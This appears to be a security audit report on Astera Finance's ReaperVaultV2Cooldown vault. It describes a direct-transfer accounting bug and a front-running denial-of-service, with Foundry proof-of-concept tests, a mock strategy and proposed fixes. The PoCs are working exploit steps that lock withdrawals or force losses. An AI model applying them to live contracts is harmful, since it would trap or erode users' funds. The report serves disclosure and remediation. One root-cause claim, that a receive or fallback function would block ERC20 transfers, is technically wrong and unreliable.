# Astera-Finance
Astera Finance || An ERC721-based withdraw cooldown mechanism || 28 August 2025 to 1 Sep 2025 

My Finding Summay
|ID|Title|Severity|
|:-:|:---|:------:|
|[H-01](#h-01-a-malicious-user-can-send-tokens-directly-to-the-Reapervaultv2cooldown.sol-to-DOS-withdrawals-for-all-users-and-force-strategies-to-incur-losses-by-making-unnecessary-pulls-and-underestimating-liquidity)|A malicious user can send tokens directly to the
`Reapervaultv2cooldown.sol` to DOS withdrawals for all users and force strategies to incur losses by making unnecessary pulls and underestimating liquidity |HIGH|
||||
|[M-01](#m-01-an-attacker-can-DOS-withdrawals-and-force-losses-on-other-users-by-frontrunning-with-large-withrawals-in-`Reapervaultv2cooldown.sol`)|An attacker can DOS withdrawals and force losses on othher users by frontrunning with large withrawals in `Reapervaultv2cooldown.sol`.|MEDIUM|


## [H-01] A malicious user can send tokens directly to the
`Reapervaultv2cooldown.sol` to DOS withdrawals for all users and force strategies to incur losses by making unnecessary pulls and underestimating liquidity. 

### Description

In `ReaperVaultV2Cooldown.sol` is vulnerable to direct token transfers of the underlying asset  `(token)` to the vault's address, which bypasses the `deposit` function. This creates `unaccounted "extra" tokens`, as the transfer increases `token.balanceOf(address(this))` but does not update `totalIdle or totalAllocated`. In the contract's withdrawal logic in `_withdraw`, it uses `vaultBalance = totalIdle` to check available liquidity, ignoring the extras. This leads to an accounting mismatch where `token.balanceOf(vault) > totalIdle`, causing the vault to underestimate its available liquidity. As a result, withdrawals that could be covered by the actual vault balance `(including extras)` trigger `unnecessary strategy withdrawals`, potentially incurring losses. With a strict slippage limit `(withdrawMaxLoss = 1 BPS or 0.01%)`, these losses often exceed the allowed threshold realistically, causing a `denial-of-service (DoS)` by reverting withdrawals. When the slippage are updated, it potentially mixes the `extras into totalIdle`, which leads to reducing user funds and strategy allocations, causes `deposit dilution` for `future depositors`.  The sender of the direct transfer receives no shares, leaving their tokens stuck, recoverable only by an `admin via inCaseTokensGetStuck`. 

### Root Cause

- Direct ERC20 token transfers to the vault address `(e.g., token.transfer(vault, amount))` are permitted because the contract lacks a `receive() or fallback function to revert them`.(This is the main root-cause.)T

- The `deposit function` is the only intended entry point for adding funds, which updates `totalIdle (totalIdle += _amount)` and `mints shares`.

- In `_withdraw`, liquidity is assessed using `vaultBalance = totalIdle`, excluding extras. when `value > totalIdle`, a strategy pull occurs via `IStrategy.withdraw`, even if `token.balanceOf(vault) >= value`.

- Strategy withdrawals can report losses `(loss = IStrategy.withdraw(...))`, reducing the withdrawn amount `(value -= loss)` and `accumulating totalLoss`.

- The slippage check `(require(totalLoss <= ((value + totalLoss) * withdrawMaxLoss) / PERCENT_DIVISOR, "Withdraw loss exceeds slippage"))` reverts when losses exceed the limit `(default 1 BPS or 0.01%)`.

_`Withdraw`: 

```solidity
// Internal helper function to burn {_shares} of vault shares belonging to {_owner}
// and return corresponding assets to {_receiver}. Returns the number of assets that were returned.
function _withdraw(uint256 _shares, address _receiver, address _owner)
    internal
    nonReentrant
    returns (uint256 value)
{
    require(_shares != 0, "Invalid amount");
    value = (_freeFunds() * _shares) / totalSupply(); // Calculate assets to return

    uint256 vaultBalance = totalIdle;
    if (value > vaultBalance) {
        uint256 totalLoss = 0;
        uint256 queueLength = withdrawalQueue.length;
        for (uint256 i = 0; i < queueLength; i = i.uncheckedInc()) {
            if (value <= vaultBalance) {
                break;
            }

            address stratAddr = withdrawalQueue[i];
            uint256 strategyBal = strategies[stratAddr].allocated;
            if (strategyBal == 0) {
                continue;
            }

            uint256 remaining = value - vaultBalance;
            uint256 preWithdrawBal = token.balanceOf(address(this)); //audit: this uses the total token in the contract including the tokens the attacker directly sent. 
            uint256 loss = IStrategy(stratAddr).withdraw(Math.min(remaining, strategyBal));
            uint256 actualWithdrawn = token.balanceOf(address(this)) - preWithdrawBal;
            vaultBalance += actualWithdrawn;

            // Withdrawer incurs any losses from withdrawing as reported by strat
            if (loss != 0) {
                value -= loss;
                totalLoss += loss;
                _reportLoss(stratAddr, loss);
            }

            strategies[stratAddr].allocated -= actualWithdrawn;
            totalAllocated -= actualWithdrawn;
        }

        totalIdle = vaultBalance;
        if (value > vaultBalance) {
            value = vaultBalance; // Adjust value if insufficient funds
            _shares = ((value + totalLoss) * totalSupply()) / _freeFunds();
        }

        require(
            totalLoss <= ((value + totalLoss) * withdrawMaxLoss) / PERCENT_DIVISOR, 
            "Withdraw loss exceeds slippage"
        );
    }

    _burn(_owner, _shares);
    totalIdle -= value;
    token.safeTransfer(_receiver, value);

    emit Withdraw(msg.sender, _receiver, _owner, value, _shares);
} 
```


## Impacts

- The vault ignores `extras` sent by the attcker in `vaultBalance`, triggering strategy pulls for withdrawals that could be covered by the vault's actual balance which is completely unnecesssary!. This disrupts strategy allocations `(strategies[strategy].allocated -= actualWithdrawn, totalAllocated -= actualWithdrawn)`, and exposes the vault to strategy-specific risks (e.g., slippage in DeFi protocols).

- Unnecessary strategy pulls incur losses `(loss returned by IStrategy.withdraw)`, reducing the user's withdrawn amount `(value -= loss)` and recording losses in the strategy `(_reportLoss reduces allocBPS and totalAllocBPS proportionally)`. This is excessive loss.

- Denial-of-Service (DoS): With a strict `slippage limit (0.01%)`, even `small losses (e.g., 5e18 on 100e18 pull)` exceed the `allowed threshold (e.g., 0.05e18)`, reverting withdrawals. Users cannot withdraw funds, effectively locking them in the vault. 

NOW THIS DEPEND ON THESE SCENARIOS:-


1. When Withdrawals Fail (e.g., Due to Strict Slippage, as in my PoC): Withdrawal reverts after strategy pull, potentially leaving `totalIdle` inflated when extras are mixed `(e.g., totalIdle = 495e18)`, but no shares are burned or tokens transferred.

- DoS: Users cannot access funds; protocol usability degraded.

2. When Withdrawals Succeed (e.g., Higher Slippage like 10% or Lower Losses): Withdrawal completes, potentially mixing extras into `totalIdle (e.g., totalIdle = 700e18 - 500e18 = 200e18 if extras pulled)`.

- Losses incurred `(e.g., 5e18)`, reducing user funds and strategy allocations.

- Deposit Dilution: Inflated `totalIdle` increases `_freeFunds()`, reducing shares minted for subsequent depositors `(e.g., shares = (200e18 * 500e18) / 705e18 ≈ 141.84e18 < 200e18)`.
- Extras  become permanently mixed and unrecoverable by admin `(e.g., amount = 200e18 - 200e18 = 0)`. When this happens, admin cant mitigate this because the extra funds sent directly to the contract are permanently mixed and causes the issues stated above. 


## Severity : MEDIUM but due to the fact that the admin can withdraw stuck tokens only if there is withdrawal failure due to the tight slippage, but if there is an excessive slippage, it would be catastrophic. 

This attack is very cheap and non-benefitial to the attacker but can skrew the entire system BY DOSING legitimate withdrawals with min cost. `Approximately 1 token (1e18 wei) is enough to cause the issue, when a withdrawal request slightly exceeds `totalIdle`. Larger amounts (e.g., 200e18 as in my PoC) make the issue more pronounced by allowing larger withdrawals to trigger significant strategy pulls and losses. It occurs when  withdrawalAmount > totalIdle but withdrawalAmount < actualTokenBalance, Even 1 token (1e18 wei) transferred directly to the vault creates this accounting mismatch in respect of the hardcoded slippage`. 

## POC

Firstly, correct the `StrategyMock.sol` to  simulate losses like in the main contract.

```solidity
// SPDX-License-Identifier: BUSL-1.1

pragma solidity ^0.8.0;

import {IStrategy} from "../../../../src/interfaces/IStrategy.sol";
import {IERC20} from "oz/token/ERC20/IERC20.sol";

contract StrategyMock is IStrategy {
    address public vaultAddress;
    address public wantAddress;
    uint256 public availableLiquidity = type(uint256).max;
    uint256 public withdrawLossPercent = 0; // BPS (0-10000)

    function withdraw(uint256 _amount) external returns (uint256 loss) {
        require(msg.sender == vaultAddress, "Only vault can withdraw");
        
        IERC20 token = IERC20(wantAddress);
        uint256 available = availableLiquidity;
        uint256 toTransfer = _amount;
        
        // Check if we have enough liquidity
        if (_amount > available) {
            // Strategy doesn't have enough liquidity - can only provide what's available
            toTransfer = available;
            loss = _amount - available; // Loss due to insufficient liquidity
        }
        
        // Simulate withdrawal losses (slippage, etc.) on the requested amount
        if (withdrawLossPercent > 0) {
            uint256 withdrawalLoss = (_amount * withdrawLossPercent) / 10000;
            loss += withdrawalLoss;
        }
        
        // Transfer available tokens to vault (this is what actualWithdrawn will be)
        // Note: We transfer the full toTransfer amount, losses are just reported
        if (toTransfer > 0) {
            token.transfer(vaultAddress, toTransfer);
            availableLiquidity -= toTransfer;
        }
        
        return loss;
    }

    function harvest() external returns (int256 roi) {}

    function balanceOf() external view returns (uint256) {
        return availableLiquidity;
    }
    
    // Test helper functions
    function setAvailableLiquidity(uint256 _amount) external {
        availableLiquidity = _amount;
    }
    
    function setWithdrawLossPercent(uint256 _lossPercent) external {
        require(_lossPercent <= 10000, "Loss percent cannot exceed 100%");
        withdrawLossPercent = _lossPercent;
    }

    function setVaultAddress(address vaultAddress_) external {
        vaultAddress = vaultAddress_;
    }

    function vault() external view returns (address) {
        return vaultAddress;
    }

    function setWantAddress(address wantAddress_) external {
        wantAddress = wantAddress_;
    }

    function want() external view returns (address) {
        return wantAddress;
    }

    function approveVaultSpender() external returns (bool) {
        return IERC20(wantAddress).approve(vaultAddress, type(uint256).max);
    }
}
```

Add this function test in the `VaultCooldown.t.sol` file and run.

NOW, also add these imports in the file:

```solidity
import {StrategyMock} from "./mock/StrategyMock.sol";
import {console} from "forge-std/console.sol";
```

```solidity 
    function testDirectTokenTransferBugAndImpact() public {
        address user1 = makeAddr("user1");
        address attacker = makeAddr("attacker");
        
        deal(address(assetMock), user1, 1000e18);
        deal(address(assetMock), attacker, 200e18);

        vm.startPrank(user1);
        assetMock.approve(address(sut), 1000e18);
        sut.deposit(1000e18);
        vm.stopPrank();

        StrategyMock strategy = new StrategyMock();
        strategy.setVaultAddress(address(sut));
        strategy.setWantAddress(address(sut.token()));
        strategy.setAvailableLiquidity(1000e18);
        strategy.setWithdrawLossPercent(500); // 5% withdrawal losses

        vm.startPrank(DEFAULT_ADMIN.addr);
        sut.addStrategy(address(strategy), 1000, 8000);
        vm.stopPrank();

        deal(address(assetMock), address(strategy), 1200e18);
        strategy.approveVaultSpender();
        
        vm.startPrank(address(strategy));
        sut.report(200e18, 0);
        vm.stopPrank();

        // Assert initial state: low totalIdle due to strategy allocation
        // Calculation: totalIdle = 1000e18 (deposits) - 600e18 (allocated to strategy) = 400e18
        uint256 initialTotalIdle = sut.totalIdle();
        uint256 initialTokenBalance = assetMock.balanceOf(address(sut));
        assertEq(initialTotalIdle, 400e18);
        assertEq(initialTokenBalance, 400e18);

        // Direct transfer creates unaccounted funds
        vm.startPrank(attacker);
        assetMock.transfer(address(sut), 200e18);
        vm.stopPrank();

        // Assert accounting mismatch
        // Calculation: totalIdle remains 400e18 (direct transfer doesn't update accounting)
        // Calculation: token.balanceOf(vault) = 400e18 + 200e18 = 600e18 (actual tokens increased)
        uint256 afterTransferTotalIdle = sut.totalIdle();
        uint256 afterTransferTokenBalance = assetMock.balanceOf(address(sut));
        assertEq(afterTransferTotalIdle, 400e18); // totalIdle unchanged
        assertEq(afterTransferTokenBalance, 600e18); // token balance increased
        assertTrue(afterTransferTokenBalance > afterTransferTotalIdle); // Accounting mismatch

        vm.startPrank(user1);
        sut.initiateWithdraw(500e18); // Withdrawal > totalIdle but < actual token balance
        vm.stopPrank();

        skip(sut.cooldownPeriod() + 1);

        // Assert withdrawal conditions
        // Calculation: 500e18 > 400e18 (totalIdle) = true → triggers strategy withdrawal
        // Calculation: 500e18 < 600e18 (actual tokens) = true → vault has sufficient funds
        // Calculation: withdrawMaxLoss = 1 BPS = 0.01% → strict slippage limit
        assertTrue(500e18 > sut.totalIdle()); // Will trigger strategy withdrawal
        assertTrue(500e18 < assetMock.balanceOf(address(sut))); // But vault has enough tokens
        assertEq(sut.withdrawMaxLoss(), 1); // Strict 0.01% slippage limit

        ReaperERC721WithdrawCooldown nft = sut.withdrawCooldownNft();
        uint256 user1TokenId = nft.tokenOfOwnerByIndex(user1, 0);
        
        vm.startPrank(user1);
        // DoS: Withdrawal reverts due to unnecessary strategy losses exceeding slippage limit
        // Calculation: Strategy pulls 100e18 (500-400), reports 5% loss = 5e18
        // Calculation: Slippage limit = 500e18 * 1 BPS / 10000 = 0.05e18
        // Calculation: 5e18 > 0.05e18 → exceeds limit by 100x → reverts
        vm.expectRevert(bytes("Withdraw loss exceeds slippage"));
        sut.withdraw(user1TokenId);
        vm.stopPrank();

        // Assert attacker tokens are stuck
        // Calculation: Attacker never called deposit() → no shares minted → 0 balance
        uint256 attackerShares = sut.balanceOf(attacker);
        assertEq(attackerShares, 0);
    }
```

## Mitigation

Lets walk carely for this fix, it can be understood.

1. In the `_withdraw` fucntion: Add this code to it

```solidity
   // Internal helper function to burn {_shares} of vault shares belonging to {_owner}
    // and return corresponding assets to {_receiver}. Returns the number of assets that were returned.
    function _withdraw(uint256 _shares, address _receiver, address _owner)
        internal
        nonReentrant
        returns (uint256 value)
    {
        require(_shares != 0, "Invalid amount");
        
 +       // Calculate withdrawal value based on current accounting (before any sync)
 +       value = (_freeFunds() * _shares) / totalSupply();
        
 +      // Check if we have sufficient actual tokens to cover this withdrawal
 +       uint256 actualBalance = token.balanceOf(address(this));
        uint256 vaultBalance = totalIdle;
        
 +      // If we have sufficient actual tokens, sync totalIdle to include any direct transfers
 +       // This prevents unnecessary strategy calls while treating direct transfers as donations
 +       if (actualBalance >= value && actualBalance > totalIdle) {
 +           totalIdle = actualBalance;
 +           vaultBalance = totalIdle;
 +      }

        if (value > vaultBalance) {
            uint256 totalLoss = 0;
            uint256 queueLength = withdrawalQueue.length;
            for (uint256 i = 0; i < queueLength; i = i.uncheckedInc()) {
                if (value <= vaultBalance) {
                    break;
                }

               ----rest of code------
    }
```
a. This would ensure that there is no more unnecessary strategy calls when vault has sufficient actual tokens. 
b. Direct transfers are incorporated as donations benefiting all shareholders, users would get their proportional share of the enlarged vault value.
c. It would avoid triggering lossy strategy withdrawals when not needed. 

2. We have to make this change consistent, so in the `_deposit()` Function. If we dont make this change; Share calculations could be based on stale accounting data when direct transfers occurred between deposits.

Add this code to it: 

```solidity
    // Internal helper function to deposit {_amount} of assets and mint corresponding
    // shares to {_receiver}. Returns the number of shares that were minted.
    function _deposit(uint256 _amount, address _receiver) internal nonReentrant returns (uint256 shares) {
        require(!emergencyShutdown, "Cannot deposit during emergency shutdown");
        require(_amount != 0, "Invalid amount");
        require(balance() + _amount <= tvlCap, "Vault is full");
        
    +    // Sync totalIdle with actual balance to account for any direct token transfers (treat as donations)
    +    uint256 actualBalance = token.balanceOf(address(this));
    +    if (actualBalance > totalIdle) {
    +        totalIdle = actualBalance;
    +   }

        uint256 supply = totalSupply();
        if (supply == 0) {
            shares = _amount;
        } else {
            shares = (_amount * supply) / _freeFunds(); // use "freeFunds" instead of "balance"
        }

        _mint(_receiver, shares);
        totalIdle += _amount;
        token.safeTransferFrom(msg.sender, address(this), _amount);
        emit Deposit(msg.sender, _receiver, _amount, shares);
    }
```

a. This fix ensures share calculations reflect true vault value including donations.
b. New depositors get fair share allocation based on actual vault assets.
c. Direct transfers benefit existing shareholders before new deposits. 

3. Same fix goes to `_report` function becasue strategy reporting and allocation calculations could be based on outdated vault balance data.

```solidity
    /**
     * @notice Main contact point where each strategy interacts with the vault during its harvest
     * to report profit/loss as well as any repayment of debt.
     * @param _roi The return on investment (positive or negative) given as the total amount
     * gained or lost from the harvest.
     * @param _repayment The repayment of debt by the strategy.
     */
    function report(int256 _roi, uint256 _repayment) external returns (uint256) {
      +  // Sync totalIdle with actual balance to account for any direct token transfers (treat as donations)
      +  uint256 actualBalance = token.balanceOf(address(this));
      +  if (actualBalance > totalIdle) {
      +     totalIdle = actualBalance;
      +  }
```
a.  Strategy allocation calculations use correct vault balance, Management and performance fees calculated on actual vault value, trategy reports reflect true vault state including direct tranfers, and Avoids over/under-allocation due to accounting mismatches. 

---
---
--- 


## [M-01] An attacker can DOS withdrawals and force losses on othher users by frontrunning with large withrawals in `Reapervaultv2cooldown.sol`.

###  Description

In the `ReaperVaultV2Cooldown.sol`, the `_withdraw` function processes withdrawals by first pulling from `totalIdle`, then iterating through `withdrawalQueue` to cover remaining funds, with a `strict slippage check (withdrawMaxLoss)`. If a strategy incurs losses exceeding `withdrawMaxLoss (default 0.01%)`, the withdrawal reverts. This allows an attacker to front-run a victim’s withdrawal by consuming `totalIdle` with large withdrawals, forcing the victim to pull from a `lossy strategy`, resulting in either:

- DoS: The victim’s withdrawal reverts when the losses exceed `withdrawMaxLoss`.

- Forced Loss: When admins increase `withdrawMaxLoss` to allow withdrawals, victims incur more losses than the required from the strategy.

This creates a scenario where attackers can exploit the shared `idle fund pool` and withdrawal cooldown mechanism to either permanently trap victim funds (DoS) or force victims to accept financial losses. The attack leverages the first-come-first-served nature of idle fund access combined with strict slippage protection to create a lose-lose scenario for other users.

Root Cause in `_withdraw`:
```solidity
// In _withdraw() function (lines 482-523)
uint256 vaultBalance = totalIdle;  // Shared pool vulnerable to depletion
if (value > vaultBalance) {        // Attacker forces this condition
    // Forces victim into strategy withdrawal with losses
    uint256 loss = IStrategy(stratAddr).withdraw(...);
    if (loss != 0) {
        value -= loss;  //<-----------------  VICTIM LOSES MONEY
        totalLoss += loss;
    }
    require(
        totalLoss <= ((value + totalLoss) * withdrawMaxLoss) / PERCENT_DIVISOR,
        "Withdraw loss exceeds slippage"  // <------------ DoS CONDITION
    );
}
```
My PoC demonstrates this by:
- Depositing `1500e18 (attacker: 1000e18, victim1: 500e18).`
- Allocating `750e18` to a strategy with `1%` loss.
- Attacker frontrun and withdraws `700e18`, leaving `50e18` in totalIdle.
- Victim1’s `200e18` withdrawal requires `150e18` from the strategy, incurring a `1.5e18` loss, which:

- Reverts with `withdrawMaxLoss=1 BPS` (DoS).
- Succeeds with `withdrawMaxLoss=200 BPS`, forcing a `1.5e18` loss.

### Impact:

1. Denial of Service (DoS): Victims’ funds are temporarily locked if `totalIdle` is insufficient and strategy losses exceed `withdrawMaxLoss`. Withdrawals remain blocked until admins increase slippage. 

2. Forced Losses:Increasing `withdrawMaxLoss ( to 2%)` allows withdrawals but forces victims to accept losses `(e.g., 1% on strategy pulls)`, eroding user funds. This happens, when admin updates the `withdrawMaxLoss` to allows the success of withdrawals, but by doing this, massive losses are forced on users. 

### Severity:
-  Medium. While funds are not permanently lost, the DoS locks user capital, and forced losses reduce user balances. 

## Mitigation

- Implement a per-transaction withdrawal cap `(e.g., max 10% of totalIdle + totalAllocated)` to limit how much `totalIdle` an attacker can consume, ensuring victims can access idle funds.

### Proof of concept

Create a file, `StrategyMock.sol` and add this code to it to simulate strategy losses. 

```solidity
// SPDX-License-Identifier: BUSL-1.1

pragma solidity ^0.8.0;

import {IStrategy} from "../../../../src/interfaces/IStrategy.sol";
import {IERC20} from "oz/token/ERC20/IERC20.sol";

contract StrategyMock is IStrategy {
    address public vaultAddress;
    address public wantAddress;
    uint256 public availableLiquidity = type(uint256).max;
    uint256 public withdrawLossPercent = 0; // BPS (0-10000)

    function withdraw(uint256 _amount) external returns (uint256 loss) {
        require(msg.sender == vaultAddress, "Only vault can withdraw");
        
        IERC20 token = IERC20(wantAddress);
        uint256 available = availableLiquidity;
        uint256 toTransfer = _amount;
        
        // Check if we have enough liquidity
        if (_amount > available) {
            // Strategy doesn't have enough liquidity - can only provide what's available
            toTransfer = available;
            loss = _amount - available; // Loss due to insufficient liquidity
        }
        
        // Simulate withdrawal losses (slippage, etc.) on the amount we can actually transfer
        // This ensures losses are reasonable and don't cause underflow in the vault
        if (withdrawLossPercent > 0 && toTransfer > 0) {
            uint256 withdrawalLoss = (toTransfer * withdrawLossPercent) / 10000;
            loss += withdrawalLoss;
            // Reduce the transfer amount by the slippage loss
            toTransfer = toTransfer - withdrawalLoss;
        }
        
        // Transfer available tokens to vault (this is what actualWithdrawn will be)
        if (toTransfer > 0) {
            token.transfer(vaultAddress, toTransfer);
            availableLiquidity -= toTransfer;
        }
        
        return loss;
    }

    function harvest() external returns (int256 roi) {}

    function balanceOf() external view returns (uint256) {
        return availableLiquidity;
    }
    
    // Test helper functions
    function setAvailableLiquidity(uint256 _amount) external {
        availableLiquidity = _amount;
    }
    
    function setWithdrawLossPercent(uint256 _lossPercent) external {
        require(_lossPercent <= 10000, "Loss percent cannot exceed 100%");
        withdrawLossPercent = _lossPercent;
    }

    function setVaultAddress(address vaultAddress_) external {
        vaultAddress = vaultAddress_;
    }

    function vault() external view returns (address) {
        return vaultAddress;
    }

    function setWantAddress(address wantAddress_) external {
        wantAddress = wantAddress_;
    }

    function want() external view returns (address) {
        return wantAddress;
    }

    function approveVaultSpender() external returns (bool) {
        return IERC20(wantAddress).approve(vaultAddress, type(uint256).max);
    }
}
```

After, create another file and add this test to it to test the vul.

```solidity
// SPDX-License-Identifier: BUSL-1.1

pragma solidity ^0.8.0;

import {VaultBaseTest} from "./VaultBase.t.sol";
import {ReaperERC721WithdrawCooldown} from "../../../src/ReaperERC721WithdrawCooldown.sol";
import {StrategyMock} from "./mock/StrategyMock.sol";
import {console} from "forge-std/console.sol";
import {Vm} from "forge-std/Vm.sol";
import {IERC721Receiver} from "oz/token/ERC721/IERC721Receiver.sol";
import {IERC20} from "oz/token/ERC20/IERC20.sol";
import {ReaperVaultV2Cooldown} from "../../../src/ReaperVaultV2Cooldown.sol";



contract VaultCooldownTest is VaultBaseTest {
       function testFrontRunningAttackDoSAndForcedLoss() public {
        address attacker = makeAddr("attacker");
        address victim1 = makeAddr("victim1");
        
        // Setup users with deposits
        deal(address(assetMock), attacker, 1000e18);
        deal(address(assetMock), victim1, 500e18);

        // All users deposit
        vm.startPrank(attacker);
        assetMock.approve(address(sut), 1000e18);
        sut.deposit(1000e18);
        vm.stopPrank();

        vm.startPrank(victim1);
        assetMock.approve(address(sut), 500e18);
        sut.deposit(500e18);
        vm.stopPrank();

        // Setup strategy with loss
        StrategyMock lossyStrategy = new StrategyMock();
        lossyStrategy.setVaultAddress(address(sut));
        lossyStrategy.setWantAddress(address(sut.token()));

        vm.startPrank(DEFAULT_ADMIN.addr);
        sut.addStrategy(address(lossyStrategy), 1000, 5000); // 50% allocation
        vm.stopPrank();

        // Strategy gets allocated funds (50% of 1500e18 total deposits = 750e18)
        deal(address(assetMock), address(lossyStrategy), 750e18);
        lossyStrategy.approveVaultSpender();
        
        vm.startPrank(address(lossyStrategy));
        sut.report(0, 0); // Trigger allocation: totalIdle becomes 750e18
        vm.stopPrank();

        // Configure strategy with 1% loss rate
        lossyStrategy.setWithdrawLossPercent(100); // 1% loss
        deal(address(assetMock), address(lossyStrategy), 750e18);
        lossyStrategy.approveVaultSpender();

        // === PART 1: DEMONSTRATE DoS ATTACK (Strict Slippage) ===
        // Default slippage is 0.01% (1 BPS), strategy has 1% loss rate
        
        // Attacker and victim initiate withdrawals
        vm.startPrank(attacker);
        sut.initiateWithdraw(700e18); // Consume most idle funds, leaving only 50e18
        vm.stopPrank();

        vm.startPrank(victim1);
        sut.initiateWithdraw(200e18); // Will be forced into strategy loss (200e18 > 50e18 idle)
        vm.stopPrank();

        skip(sut.cooldownPeriod() + 1);

        ReaperERC721WithdrawCooldown nft = sut.withdrawCooldownNft();
        uint256 attackerTokenId = nft.tokenOfOwnerByIndex(attacker, 0);
        uint256 victim1TokenId = nft.tokenOfOwnerByIndex(victim1, 0);

        // Attacker withdraws successfully using idle funds (no strategy interaction)
        vm.startPrank(attacker);
        sut.withdraw(attackerTokenId);
        vm.stopPrank();

        // Verify remaining idle funds are insufficient for victim1
        uint256 remainingIdle = sut.totalIdle();
        assertTrue(remainingIdle < 200e18, "Idle funds should be insufficient for victim1");

        // Victim1 CANNOT withdraw - DoS due to strict slippage (1% strategy loss > 0.01% limit)
        vm.startPrank(victim1);
        vm.expectRevert("Withdraw loss exceeds slippage");
        sut.withdraw(victim1TokenId);
        vm.stopPrank();

        // === PART 2: DEMONSTRATE FORCED LOSS ATTACK (Loose Slippage) ===
        // Admin increases slippage to "help" victim1, but this forces them to accept losses
        
        vm.startPrank(STRATEGIST.addr);
        sut.updateWithdrawMaxLoss(200); // 2% slippage tolerance (allows 1% strategy loss)
        vm.stopPrank();

        // Now victim1 CAN withdraw but will lose money due to strategy interaction
        uint256 victim1BalanceBefore = assetMock.balanceOf(victim1);
        
        vm.startPrank(victim1);
        sut.withdraw(victim1TokenId); // Succeeds but with forced losses
        vm.stopPrank();
        
        uint256 victim1BalanceAfter = assetMock.balanceOf(victim1);
        uint256 victim1Received = victim1BalanceAfter - victim1BalanceBefore;
        uint256 victim1Loss = 200e18 - victim1Received;
        
        // Verify the attack succeeded - victim1 was forced to accept losses
        assertTrue(victim1Loss > 0, "Victim1 should have incurred losses");
        assertTrue(victim1Loss >= (200e18 * 70) / 10000, "Loss should be ~0.75% (strategy loss on portion)");
        
        // ATTACK SUMMARY:
        // 1. Attacker front-ran victim's withdrawal by consuming idle funds
        // 2. Forced victim into lossy strategy withdrawal 
        // 3. With strict slippage: Victim funds TRAPPED (DoS)
        // 4. With loose slippage: Victim FORCED to accept losses
        // 5. Attacker benefits either way - gets clean withdrawal while harming others
    }
}    
```